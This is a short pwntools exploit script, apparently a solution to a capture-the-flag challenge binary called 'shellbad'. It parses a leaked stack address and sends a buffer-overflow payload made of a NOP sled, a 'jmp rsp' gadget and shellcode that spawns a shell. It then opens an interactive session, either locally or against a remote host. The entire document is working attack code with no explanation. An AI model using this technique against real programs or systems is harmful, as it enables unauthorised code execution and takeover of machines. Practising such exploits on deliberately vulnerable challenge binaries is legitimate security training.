from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
'''.format(**locals())

exe = './shellbad'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context(terminal=['tmux', 'split-window', '-h'])

io = start()

io.sendline(b'a')
io.recvuntil(b'at: ')
leak = int(io.recvline()[:-1], 16)
gadget = leak + 0x8
log.success("Leak: %#x", leak)
log.success("Rsp location: %#x", gadget)

jmp_rsp = asm('jmp rsp')

payload = flat (
    b'\x90' * 150,
    jmp_rsp,
    gadget,
    asm(shellcraft.sh())
    )

io.sendline(b'b')
io.sendline(payload)
io.interactive()
